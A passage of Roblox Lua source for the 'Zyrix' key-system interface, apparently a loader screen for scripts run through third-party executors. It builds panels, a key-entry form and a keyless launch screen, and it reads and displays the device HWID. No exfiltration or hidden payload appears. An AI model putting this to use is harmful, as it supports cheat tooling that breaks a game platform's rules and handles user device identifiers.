            if n.id==id then table.remove(Internal.NotificationList,i) break end
        end
        tween(frame,0.28,{Position=UDim2.new(1,W+20,frame.Position.Y.Scale,frame.Position.Y.Offset)})
        task.wait(0.3) ng:Destroy() restack()
    end

    tween(frame,0.35,{Position=UDim2.new(1,-15,1,-15)})
    task.wait(0.1) restack()
    TweenService:Create(pg,TweenInfo.new(duration,Enum.EasingStyle.Linear),{Size=UDim2.new(0,0,1,0)}):Play()
    task.delay(duration,dismiss)
    local cb=Instance.new("TextButton",frame) cb.Size=UDim2.new(1,0,1,0) cb.BackgroundTransparency=1 cb.Text=""
    cb.MouseButton1Click:Connect(dismiss)
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SIDE PANELS
-- ═══════════════════════════════════════════════════════════════════════════════
local function CreateChangelogPanel(parent,winW,panH,panW,mainFrame,gap)
    panW=panW or 215
    local isOpen=false
    local panel=makeFrame({Name="ChangelogPanel",Size=UDim2.new(0,0,0,panH),Position=UDim2.new(1,gap,0,0),BackgroundColor3=T.Background,BorderSizePixel=0,ClipsDescendants=true,Parent=mainFrame})
    applyCorner(panel,UDim.new(0,8))
    local pStr=applyStroke(panel,T.Accent,1.5,1)
    local ph=makeFrame({Size=UDim2.new(1,0,0,48),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=panel})
    applyCorner(ph,UDim.new(0,8))
    makeFrame({Size=UDim2.new(1,0,0,8),Position=UDim2.new(0,0,1,-8),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=ph})
    makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,0),BackgroundColor3=T.Accent,BackgroundTransparency=0.9,BorderSizePixel=0,Parent=ph})
    makeImage({Size=UDim2.new(0,14,0,14),Position=UDim2.new(0,12,0.5,0),AnchorPoint=Vector2.new(0,0.5),Image=getIcon("changelog"),ImageColor3=T.Accent,Parent=ph})
    makeLabel({Size=UDim2.new(1,-60,1,0),Position=UDim2.new(0,32,0,0),Text="Changelog",TextColor3=T.Text,TextSize=15,TextXAlignment=Enum.TextXAlignment.Left,Font=Enum.Font.GothamBold,Parent=ph})
    local phC,_=makeIconButton(ph,getIcon("close"),T.TextDim,T.Error,UDim2.new(0,20,0,20),UDim2.new(1,-12,0.5,0),Vector2.new(1,0.5))
    phC.BackgroundTransparency=1
    local scroll=Instance.new("ScrollingFrame")
    scroll.Size=UDim2.new(1,0,1,-52) scroll.Position=UDim2.new(0,0,0,52)
    scroll.BackgroundTransparency=1 scroll.BorderSizePixel=0
    scroll.ScrollBarThickness=3 scroll.ScrollBarImageColor3=T.Accent
    scroll.CanvasSize=UDim2.new(0,0,0,0) scroll.AutomaticCanvasSize=Enum.AutomaticSize.Y scroll.Parent=panel
    local sp=Instance.new("UIPadding",scroll) sp.PaddingLeft=UDim.new(0,10) sp.PaddingRight=UDim.new(0,10) sp.PaddingTop=UDim.new(0,6) sp.PaddingBottom=UDim.new(0,6)
    local sl=Instance.new("UIListLayout",scroll) sl.Padding=UDim.new(0,10) sl.SortOrder=Enum.SortOrder.LayoutOrder
    for i,update in ipairs(Zyrix.Changelog) do
        local e=makeFrame({Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,LayoutOrder=i*2,Parent=scroll})
        local el=Instance.new("UIListLayout",e) el.Padding=UDim.new(0,4)
        makeLabel({Size=UDim2.new(1,0,0,20),Text=update.Version.."  •  "..update.Date,TextColor3=T.Accent,TextSize=13,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=1,Parent=e})
        for j,ch in ipairs(update.Changes) do
            makeLabel({Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,Text="  •  "..ch,TextColor3=T.TextDim,TextSize=11,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,TextWrapped=true,LayoutOrder=j+1,Parent=e})
        end
        if i<#Zyrix.Changelog then
            local dw=makeFrame({Size=UDim2.new(1,0,0,1),BackgroundTransparency=1,LayoutOrder=i*2+1,Parent=scroll})
            makeFrame({Size=UDim2.new(1,0,0,1),BackgroundColor3=T.Divider,BorderSizePixel=0,Parent=dw})
        end
    end
    local function toggle(clIc,cont,baseW)
        isOpen=not isOpen
        if isOpen then
            tween(pStr,0.18,{Transparency=0.5}) tween(panel,0.38,{Size=UDim2.new(0,panW,0,panH)}) tween(cont,0.38,{Size=UDim2.new(0,baseW+gap+panW,0,panH)})
            if clIc then tween(clIc,0.28,{Rotation=180}) end
        else
            tween(pStr,0.18,{Transparency=1}) tween(panel,0.28,{Size=UDim2.new(0,0,0,panH)}) tween(cont,0.28,{Size=UDim2.new(0,baseW,0,panH)})
            if clIc then tween(clIc,0.28,{Rotation=0}) end
        end
    end
    phC.MouseButton1Click:Connect(function() if isOpen then toggle(nil,parent,winW) end end)
    return panel,toggle,function() return isOpen end,panW
end

local function CreateUserInfoPanel(parent,winW,panH,panW,mainFrame,gap,startOpen)
    panW=panW or 175
    local isOpen=startOpen or false
    local compact=panH<300
    local avSz=compact and 40 or 52
    local fH=compact and 22 or 26
    local tSz=compact and 8 or 9
    local vSz=compact and 10 or 11
    local wSz=compact and 11 or 12
    local sp=compact and 3 or 5
    local panel=makeFrame({Name="UserInfoPanel",Size=UDim2.new(0,isOpen and panW or 0,0,panH),Position=UDim2.new(0,-gap,0,0),AnchorPoint=Vector2.new(1,0),BackgroundColor3=T.Background,BorderSizePixel=0,ClipsDescendants=true,Parent=mainFrame})
    applyCorner(panel,UDim.new(0,8))
    local pStr=applyStroke(panel,T.Accent,1.5,isOpen and 0.5 or 1)
    local ph=makeFrame({Size=UDim2.new(1,0,0,48),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=panel})
    applyCorner(ph,UDim.new(0,8))
    makeFrame({Size=UDim2.new(1,0,0,8),Position=UDim2.new(0,0,1,-8),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=ph})
    makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,0),BackgroundColor3=T.Accent,BackgroundTransparency=0.9,BorderSizePixel=0,Parent=ph})
    makeImage({Size=UDim2.new(0,14,0,14),Position=UDim2.new(0,12,0.5,0),AnchorPoint=Vector2.new(0,0.5),Image=getIcon("user"),ImageColor3=T.Accent,Parent=ph})
    makeLabel({Size=UDim2.new(1,-60,1,0),Position=UDim2.new(0,32,0,0),Text="User Info",TextColor3=T.Text,TextSize=15,TextXAlignment=Enum.TextXAlignment.Left,Font=Enum.Font.GothamBold,Parent=ph})
    local phC,_=makeIconButton(ph,getIcon("close"),T.TextDim,T.Error,UDim2.new(0,20,0,20),UDim2.new(1,-12,0.5,0),Vector2.new(1,0.5))
    phC.BackgroundTransparency=1
    local cf=makeFrame({Size=UDim2.new(1,0,1,-52),Position=UDim2.new(0,0,0,52),BackgroundTransparency=1,Parent=panel})
    local cpp=Instance.new("UIPadding",cf) cpp.PaddingLeft=UDim.new(0,8) cpp.PaddingRight=UDim.new(0,8)
    local cl=Instance.new("UIListLayout",cf) cl.Padding=UDim.new(0,sp) cl.SortOrder=Enum.SortOrder.LayoutOrder cl.HorizontalAlignment=Enum.HorizontalAlignment.Center cl.VerticalAlignment=Enum.VerticalAlignment.Center
    local plr=cloneref(Players.LocalPlayer)
    local avW=makeFrame({Size=UDim2.new(0,avSz+6,0,avSz+6),BackgroundTransparency=1,LayoutOrder=1,Parent=cf})
    local avG=makeFrame({Size=UDim2.new(1,0,1,0),Position=UDim2.new(0.5,0,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=T.Accent,BackgroundTransparency=0.88,BorderSizePixel=0,Parent=avW})
    applyCorner(avG,UDim.new(0,6)) applyStroke(avG,T.Accent,1,0.65)
    local avC=makeFrame({Size=UDim2.new(0,avSz,0,avSz),Position=UDim2.new(0.5,0,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=T.Input,BorderSizePixel=0,ClipsDescendants=true,Parent=avW})
    applyCorner(avC,UDim.new(0,5))
    local avI=makeImage({Size=UDim2.new(1,0,1,0),Position=UDim2.new(0.5,0,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),ScaleType=Enum.ScaleType.Crop,Parent=avC})
    pcall(function() avI.Image=Players:GetUserThumbnailAsync(plr and plr.UserId or 0,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size150x150) end)
    makeLabel({Size=UDim2.new(1,0,0,compact and 14 or 18),Text="Welcome, "..(plr and plr.DisplayName or "User"),TextColor3=T.Text,TextSize=wSz,TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=2,Font=Enum.Font.GothamBold,Parent=cf})
    makeFrame({Size=UDim2.new(1,16,0,1),Position=UDim2.new(0.5,0,0,0),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=T.Divider,BorderSizePixel=0,LayoutOrder=3,Parent=cf})
    local function infoField(lo,lbl,val)
        local c=makeFrame({Size=UDim2.new(1,0,0,fH),BackgroundTransparency=1,LayoutOrder=lo,Parent=cf})
        makeLabel({Size=UDim2.new(1,0,0,11),Text=lbl,TextColor3=T.TextDim,TextSize=tSz,TextXAlignment=Enum.TextXAlignment.Left,Font=Enum.Font.Gotham,Parent=c})
        makeLabel({Size=UDim2.new(1,0,0,14),Position=UDim2.new(0,0,0,11),Text=val,TextColor3=T.Accent,TextSize=vSz,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Font=Enum.Font.GothamBold,Parent=c})
    end
    infoField(4,"Executor",getExecutorName())
    infoField(5,"Device",  getDeviceType())
    makeFrame({Size=UDim2.new(1,16,0,1),Position=UDim2.new(0.5,0,0,0),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=T.Divider,BorderSizePixel=0,LayoutOrder=6,Parent=cf})
    local hC=makeFrame({Size=UDim2.new(1,0,0,fH),BackgroundTransparency=1,LayoutOrder=7,Parent=cf})
    makeLabel({Size=UDim2.new(1,0,0,11),Text="HWID",TextColor3=T.TextDim,TextSize=tSz,TextXAlignment=Enum.TextXAlignment.Left,Font=Enum.Font.Gotham,Parent=hC})
    local fullHWID=getHWID()
    local cbSz=16
    makeLabel({Size=UDim2.new(1,-(cbSz+6),0,14),Position=UDim2.new(0,0,0,11),Text=generateHiddenDots(panW-16-cbSz-6,5),TextColor3=T.TextDim,TextSize=compact and 9 or 10,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Font=Enum.Font.GothamBold,Parent=hC})
    local copyBtn,copyImg=makeIconButton(hC,getIcon("copy"),T.TextDim,T.Accent,UDim2.new(0,cbSz,0,cbSz),UDim2.new(1,0,0.5,1),Vector2.new(1,0.5))
    copyBtn.BackgroundTransparency=1
    copyBtn.MouseButton1Click:Connect(function()
        pcall(setclipboard,fullHWID)
        tween(copyImg,0.1,{ImageColor3=T.Success})
        task.delay(0.5,function() tween(copyImg,0.15,{ImageColor3=T.TextDim}) end)
        Zyrix:Notify("Copied","HWID copied to clipboard",2,"copy")
    end)
    makeFrame({Size=UDim2.new(1,16,0,1),Position=UDim2.new(0.5,0,0,0),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=T.Divider,BorderSizePixel=0,LayoutOrder=8,Parent=cf})
    local clkC=makeFrame({Size=UDim2.new(1,0,0,compact and 30 or 38),BackgroundTransparency=1,LayoutOrder=9,Parent=cf})
    local clkR=makeFrame({Size=UDim2.new(1,0,0,compact and 18 or 22),BackgroundTransparency=1,Parent=clkC})
    local clkRl=Instance.new("UIListLayout",clkR) clkRl.FillDirection=Enum.FillDirection.Horizontal clkRl.HorizontalAlignment=Enum.HorizontalAlignment.Center clkRl.VerticalAlignment=Enum.VerticalAlignment.Center clkRl.Padding=UDim.new(0,5)
    makeImage({Size=UDim2.new(0,compact and 13 or 15,0,compact and 13 or 15),Image=getIcon("clock"),ImageColor3=T.Accent,LayoutOrder=1,Parent=clkR})
    local clkT=makeLabel({Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,Text=formatTime12(),TextColor3=T.Accent,TextSize=compact and 13 or 15,Font=Enum.Font.GothamBold,LayoutOrder=2,Parent=clkR})
    local clkD=makeLabel({Size=UDim2.new(1,0,0,compact and 12 or 14),Position=UDim2.new(0,-8,0,compact and 18 or 22),Text=formatDate(),TextColor3=T.TextDim,TextSize=compact and 9 or 10,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Center,Parent=clkC})
    local clockOn=true
    task.spawn(function()
        while clockOn do
            if not clkT or not clkT.Parent then clockOn=false break end
            clkT.Text=formatTime12() clkD.Text=formatDate() task.wait(1)
        end
    end)
    panel.Destroying:Connect(function() clockOn=false end)
    local function toggle(uIc,cont,baseW)
        isOpen=not isOpen
        if isOpen then
            tween(pStr,0.18,{Transparency=0.5}) tween(panel,0.38,{Size=UDim2.new(0,panW,0,panH)}) tween(cont,0.38,{Size=UDim2.new(0,baseW+gap+panW,0,panH)})
        else
            tween(pStr,0.18,{Transparency=1}) tween(panel,0.28,{Size=UDim2.new(0,0,0,panH)}) tween(cont,0.28,{Size=UDim2.new(0,baseW,0,panH)})
        end
    end
    phC.MouseButton1Click:Connect(function() if isOpen then toggle(nil,parent,winW) end end)
    return panel,toggle,function() return isOpen end,panW
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  DRAGGING
-- ═══════════════════════════════════════════════════════════════════════════════
local function setupDragging(handle,frame)
    if not Zyrix.Options.Draggable then return end
    local dragging,dragStart,startPos,dragInput
    handle.InputBegan:Connect(function(input)
        if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
            dragging,dragStart,startPos,dragInput=true,input.Position,frame.Position,input
            input.Changed:Connect(function()
                if input.UserInputState==Enum.UserInputState.End and dragInput==input then
                    dragging,dragInput=false,nil
                end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if not dragging or not dragInput then return end
        local isMo=input.UserInputType==Enum.UserInputType.MouseMovement
        local isTch=input.UserInputType==Enum.UserInputType.Touch and input==dragInput
        if isMo or isTch then
            local d=input.Position-dragStart
            frame.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
        end
    end)
end

local function validateKey(key,fn)
    if not fn or not key or key=="" then return false end
    local ok,result=pcall(fn,key)
    if not ok then return false end
    if type(result)=="table"   then return result.valid==true end
    if type(result)=="boolean" then return result end
    return false
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  CENTERED WINDOW BUILDER
-- ═══════════════════════════════════════════════════════════════════════════════
local function BuildCenteredUI(winW,winH,panH,uPanW,clPanW,gap,ctx)
    local gui=ctx.gui
    local container=makeFrame({Name="Container",Size=UDim2.new(0,winW,0,panH),Position=UDim2.new(0.5,0,1.5,0),AnchorPoint=Vector2.new(0.5,0.5),BackgroundTransparency=1,Parent=gui})
    local mainFrame=makeFrame({Name="MainFrame",Size=UDim2.new(0,winW,0,winH),Position=UDim2.new(0.5,0,0,0),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=T.Background,BorderSizePixel=0,Parent=container})
    applyCorner(mainFrame,UDim.new(0,8))
    local mainStroke=applyStroke(mainFrame,T.Accent,1,0.84)
    local uPanel,toggleU,isUOpen,uPanActW=CreateUserInfoPanel(container,winW,panH,uPanW,mainFrame,gap,false)
    local clPanel,toggleCL,isCLOpen,clPanActW=CreateChangelogPanel(container,winW,panH,clPanW,mainFrame,gap)
    local function getContW()
        local w=winW
        if isUOpen()  then w=w+gap+uPanActW end
        if isCLOpen() then w=w+gap+clPanActW end
        return w
    end
    local function doToggleU(ic)
        local cw=getContW()
        if isUOpen() then toggleU(ic,container,cw-gap-uPanActW) else toggleU(ic,container,cw) end
    end
    local function doToggleCL(ic)
        local cw=getContW()
        if isCLOpen() then toggleCL(ic,container,cw-gap-clPanActW) else toggleCL(ic,container,cw) end
    end
    local function closeAll(uIc,clIc,cb)
        if isCLOpen() then doToggleCL(clIc) task.wait(0.3) end
        if isUOpen()  then doToggleU(uIc)   task.wait(0.3) end
        if cb then cb() end
    end
    return {container=container,mainFrame=mainFrame,mainStroke=mainStroke,toggleUser=doToggleU,toggleCL=doToggleCL,isUserOpen=isUOpen,isChangelogOpen=isCLOpen,closeAllPanels=closeAll}
end

local function BuildHeader(parent,mobile)
    local header=makeFrame({Size=UDim2.new(1,0,0,50),BackgroundColor3=T.Header,BorderSizePixel=0,Active=true,Parent=parent})
    applyCorner(header,UDim.new(0,8))
    makeFrame({Size=UDim2.new(1,0,0,8),Position=UDim2.new(0,0,1,-8),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=header})
    makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,0),BackgroundColor3=T.Accent,BackgroundTransparency=0.9,BorderSizePixel=0,Parent=header})
    makeImage({Size=Zyrix.Appearance.IconSize,Position=UDim2.new(0,14,0.5,0),AnchorPoint=Vector2.new(0,0.5),Image=getLogoIcon(),ImageColor3=T.Text,Parent=header})
    makeLabel({Size=UDim2.new(1,-90,1,0),Position=UDim2.new(0,14+Zyrix.Appearance.IconSize.X.Offset+10,0,0),Text=Zyrix.Appearance.Title,TextColor3=T.Text,TextSize=mobile and 22 or 24,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,Parent=header})
    local closeBtn,_=makeIconButton(header,getIcon("close"),T.TextDim,T.Error,UDim2.new(0,22,0,22),UDim2.new(1,-14,0.5,0),Vector2.new(1,0.5))
    closeBtn.BackgroundTransparency=1
    return header,closeBtn
end

local function BuildBottomBar(parent,yPos,hasChangelog)
    local offsets=hasChangelog and {-44,0,44} or {-22,22}
    local names=hasChangelog and {"user","discord","changelog"} or {"user","discord"}
    local buttons={}
    for i,name in ipairs(names) do
        local btn,img=makeIconButton(parent,getIcon(name),name=="discord" and T.Discord or T.TextDim,name=="discord" and T.DiscordHover or T.Accent,UDim2.new(0,34,0,34),UDim2.new(0.5,offsets[i],0,yPos),Vector2.new(0.5,0))
        buttons[name]={btn=btn,img=img}
    end
    return buttons
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  KEYLESS UI
-- ═══════════════════════════════════════════════════════════════════════════════
local function handleKeylessSkip()
    getgenv().SCRIPT_KEY="KEYLESS" getgenv().ZyrixLoaded=false
    Zyrix:Notify("Access Granted","Keyless access approved!",3,"success")
    task.wait(0.3) if Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end
end

local function BuildKeylessUI()
    for _,n in ipairs({"ZyrixKeylessSystem","ZyrixKeySystem"}) do
        local g=hui:FindFirstChild(n); if g then g:Destroy() end
    end
    enableBlur()
    local mobile=isMobile()
    local winW,winH=300,260
    local uPanW,clPanW,gap=160,195,10
    local gui=Instance.new("ScreenGui")
    gui.Name="ZyrixKeylessSystem" gui.ResetOnSpawn=false gui.IgnoreGuiInset=true gui.DisplayOrder=10 gui.Parent=hui
    local ui=BuildCenteredUI(winW,winH,winH,uPanW,clPanW,gap,{gui=gui})
    local container,main,mainStroke=ui.container,ui.mainFrame,ui.mainStroke
    local header,closeBtn=BuildHeader(main,mobile)
    local sb=makeFrame({Size=UDim2.new(0.92,0,0,50),Position=UDim2.new(0.5,0,0,60),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=T.Accent,BackgroundTransparency=0.92,BorderSizePixel=0,Parent=main})
    applyCorner(sb,UDim.new(0,6)) applyStroke(sb,T.Accent,1,0.72)
    local checkImg=makeImage({Size=UDim2.new(0,22,0,22),Position=UDim2.new(0,14,0.5,0),AnchorPoint=Vector2.new(0,0.5),Image=getIcon("check"),ImageColor3=T.Accent,Parent=sb})
    makeLabel({Size=UDim2.new(1,-56,1,0),Position=UDim2.new(0,48,0,0),Text="Access Granted",TextColor3=T.Text,TextSize=mobile and 16 or 17,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,Parent=sb})
    makeLabel({Size=UDim2.new(1,0,0,18),Position=UDim2.new(0.5,0,0,120),AnchorPoint=Vector2.new(0.5,0),Text="Keyless Script",TextColor3=T.TextDim,TextSize=mobile and 13 or 14,Font=Enum.Font.Gotham,Parent=main})
    makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,0,145),BackgroundColor3=T.Divider,BorderSizePixel=0,Parent=main})
    local launchBtn=makeButton({Size=UDim2.new(0.78,0,0,40),Position=UDim2.new(0.5,0,0,158),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=T.Accent,Parent=main})
    applyCorner(launchBtn,UDim.new(0,6)) applyStroke(launchBtn,T.AccentHover,1,0.65)
    local lc=makeFrame({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Parent=launchBtn})
    local lcl=Instance.new("UIListLayout",lc) lcl.FillDirection=Enum.FillDirection.Horizontal lcl.HorizontalAlignment=Enum.HorizontalAlignment.Center lcl.VerticalAlignment=Enum.VerticalAlignment.Center lcl.Padding=UDim.new(0,7)
    makeImage({Size=UDim2.new(0,16,0,16),Image=getIcon("shield"),ImageColor3=T.Background,LayoutOrder=1,Parent=lc})
    makeLabel({Size=UDim2.new(0,0,0,16),AutomaticSize=Enum.AutomaticSize.X,Text="Launch Script",TextColor3=T.Background,TextSize=mobile and 13 or 14,Font=Enum.Font.GothamBold,LayoutOrder=2,Parent=lc})
    launchBtn.MouseEnter:Connect(function() tween(launchBtn,0.15,{BackgroundColor3=T.AccentHover}) end)
    launchBtn.MouseLeave:Connect(function() tween(launchBtn,0.15,{BackgroundColor3=T.Accent}) end)
    local hasCL=#Zyrix.Changelog>0
    local btns=BuildBottomBar(main,208,hasCL)
    local doors=CreateDoorOverlay(main,winW,winH)
    btns["user"].btn.MouseButton1Click:Connect(function() ui.toggleUser(btns["user"].img) end)
    btns["discord"].btn.MouseButton1Click:Connect(function()
        if Zyrix.Links.Discord~="" then Zyrix:Notify("Discord","Invite link copied!",2,"discord") pcall(setclipboard,Zyrix.Links.Discord) end
    end)
    if hasCL then btns["changelog"].btn.MouseButton1Click:Connect(function() ui.toggleCL(btns["changelog"].img) end) end
    local function exitDoors(cb)
        ui.closeAllPanels(btns["user"].img,hasCL and btns["changelog"].img or nil,function()
            doors.close(function() task.wait(0.25) if cb then cb() end end)
        end)
    end
    closeBtn.MouseButton1Click:Connect(function()
        Zyrix:Notify("Goodbye","See you next time!",2,"close")
        exitDoors(function()
            fullCleanup() hideBackground()
            tween(container,0.38,{Position=UDim2.new(0.5,0,-0.5,0)})
            tween(main,0.28,{BackgroundTransparency=1})
            task.wait(0.4) gui:Destroy()
        end)
        if Zyrix.Callbacks.OnClose then Zyrix.Callbacks.OnClose() end
    end)
    launchBtn.MouseButton1Click:Connect(function()
        Zyrix:Notify("Launching","Script loaded successfully!",2,"success")
        getgenv().SCRIPT_KEY="KEYLESS" getgenv().ZyrixLoaded=false
        exitDoors(function()
            disableBlur() hideBackground()
            tween(container,0.38,{Position=UDim2.new(0.5,0,-0.5,0)})
            tween(main,0.28,{BackgroundTransparency=1})
            task.wait(0.4) gui:Destroy()
            if not Internal.IsJunkieMode and Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end
        end)
    end)
    setupDragging(header,container)
    tween(container,0.45,{Position=UDim2.new(0.5,0,0.45,0)})
    task.wait(0.55)
    doors.open(function()
        checkImg.Size=UDim2.new(0,0,0,0)
        TweenService:Create(checkImg,TweenInfo.new(0.38,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Size=UDim2.new(0,22,0,22)}):Play()
        task.wait(0.18) ui.toggleUser(btns["user"].img)
        if hasCL then task.wait(0.28) ui.toggleCL(btns["changelog"].img) end
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  KEY UI
-- ═══════════════════════════════════════════════════════════════════════════════
local function BuildKeyUI()
    for _,n in ipairs({"ZyrixKeySystem","ZyrixKeylessSystem"}) do
        local g=hui:FindFirstChild(n); if g then g:Destroy() end
    end
    enableBlur()
    local mobile=isMobile()
    local scale=getScale()
    local showShop=isShopEnabled()
    local shopH=54
    local shopExtra=showShop and (shopH+1) or 0
    local baseWinH=mobile and math.clamp(355*scale,315,395) or 355
    local winW=mobile and math.clamp(395*scale,315,435) or 395
    local winH=baseWinH+shopExtra
    local elemH=mobile and math.clamp(54*scale,46,60) or 54
    local btnH=mobile and math.clamp(40*scale,36,46) or 40
    local statusH=mobile and math.clamp(58*scale,50,66) or 58
    local uPanW,clPanW,gap=175,215,10
    local sg=Instance.new("ScreenGui")
    sg.Name="ZyrixKeySystem" sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
    sg.ResetOnSpawn=false sg.IgnoreGuiInset=true sg.DisplayOrder=10 sg.Parent=hui
    local ui=BuildCenteredUI(winW,winH,baseWinH,uPanW,clPanW,gap,{gui=sg})
    local container,main,mainStroke=ui.container,ui.mainFrame,ui.mainStroke
    local header,closeBtn=BuildHeader(main,mobile)
    local cY=58

    -- Status
    local statFrame=makeFrame({Size=UDim2.new(0.92,0,0,statusH),Position=UDim2.new(0.5,0,0,cY),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=T.Input,BorderSizePixel=0,ClipsDescendants=true,Parent=main})
    applyCorner(statFrame,UDim.new(0,6)) applyStroke(statFrame,T.Accent,1,0.9)
    local statIcon=makeImage({Size=UDim2.new(0,22,0,22),Position=UDim2.new(0,14,0.5,0),AnchorPoint=Vector2.new(0,0.5),Image=getIcon("lock"),ImageColor3=T.StatusIdle,Parent=statFrame})
    local statLabel=makeLabel({Size=UDim2.new(1,-56,1,0),Position=UDim2.new(0,48,0,0),Text=Zyrix.Appearance.Subtitle,TextColor3=T.StatusIdle,TextSize=mobile and 15 or 16,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Parent=statFrame})

    -- Input
    local inpY=cY+statusH+10
    local inputFrame=makeFrame({Size=UDim2.new(0.92,0,0,elemH),Position=UDim2.new(0.5,0,0,inpY),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=T.Input,BorderSizePixel=0,ClipsDescendants=true,Parent=main})
    applyCorner(inputFrame,UDim.new(0,6))
    local inputStroke=applyStroke(inputFrame,T.Accent,1,0.85)
    makeImage({Size=UDim2.new(0,16,0,16),Position=UDim2.new(0,12,0.5,0),AnchorPoint=Vector2.new(0,0.5),Image=getIcon("key"),ImageColor3=T.TextDim,Parent=inputFrame})
    local tb=Instance.new("TextBox")
    tb.Size=UDim2.new(1,-40,1,0) tb.Position=UDim2.new(0,34,0.5,0) tb.AnchorPoint=Vector2.new(0,0.5)
    tb.BackgroundTransparency=1 tb.Text="" tb.TextColor3=T.Text
    tb.PlaceholderText="Enter your key..." tb.PlaceholderColor3=T.TextDim
    tb.TextSize=mobile and 15 or 16 tb.Font=Enum.Font.Gotham
    tb.ClearTextOnFocus=false tb.TextTruncate=Enum.TextTruncate.AtEnd
    tb.TextXAlignment=Enum.TextXAlignment.Left tb.Parent=inputFrame
    tb.Focused:Connect(function()  tween(inputStroke,0.15,{Transparency=0.4}) end)
    tb.FocusLost:Connect(function() tween(inputStroke,0.15,{Transparency=0.85}) end)

    local divY=inpY+elemH+12
    makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,0,divY),BackgroundColor3=T.Divider,BorderSizePixel=0,Parent=main})

    local acqY=divY+14

    local function createActionBtn(label,iconKey,isPrimary,y)
        local btn=makeButton({Size=UDim2.new(0.78,0,0,btnH),Position=UDim2.new(0.5,0,0,y),AnchorPoint=Vector2.new(0.5,0),BackgroundColor3=isPrimary and T.Accent or T.Input,Parent=main})
        applyCorner(btn,UDim.new(0,6))
        applyStroke(btn,isPrimary and T.AccentHover or T.Accent,1,isPrimary and 0.65 or 0.88)
        local fc=makeFrame({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Parent=btn})
        local fl=Instance.new("UIListLayout",fc) fl.FillDirection=Enum.FillDirection.Horizontal fl.HorizontalAlignment=Enum.HorizontalAlignment.Center fl.VerticalAlignment=Enum.VerticalAlignment.Center fl.Padding=UDim.new(0,7)
        makeImage({Size=UDim2.new(0,16,0,16),Image=getIcon(iconKey),ImageColor3=isPrimary and T.Background or T.Text,LayoutOrder=1,Parent=fc})
        makeLabel({Size=UDim2.new(0,0,0,16),AutomaticSize=Enum.AutomaticSize.X,Text=label,TextColor3=isPrimary and T.Background or T.Text,TextSize=mobile and 13 or 14,Font=Enum.Font.GothamBold,LayoutOrder=2,Parent=fc})
        local orig=btn.BackgroundColor3
        local hover=isPrimary and T.AccentHover or Color3.fromRGB(30,30,30)
        btn.MouseEnter:Connect(function() tween(btn,0.15,{BackgroundColor3=hover}) end)
        btn.MouseLeave:Connect(function() tween(btn,0.15,{BackgroundColor3=orig}) end)
        return btn
    end

    local getKeyBtn=createActionBtn("Get Key","key",false,acqY)
    local redeemBtn=createActionBtn("Redeem Key","shield",true,acqY+btnH+6)
    local bottomY=acqY+btnH*2+12
    local hasCL=#Zyrix.Changelog>0
    local btns=BuildBottomBar(main,bottomY,hasCL)

    -- Shop
    if showShop then
        makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-shopH-1),BackgroundColor3=T.Accent,BackgroundTransparency=0.88,BorderSizePixel=0,Parent=main})
        local sf=makeFrame({Size=UDim2.new(1,0,0,shopH),Position=UDim2.new(0,0,1,-shopH),BackgroundColor3=T.Header,BorderSizePixel=0,ClipsDescendants=true,Parent=main})
        applyCorner(sf,UDim.new(0,8))
        makeFrame({Size=UDim2.new(1,0,0,8),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=sf})
        local siW=28
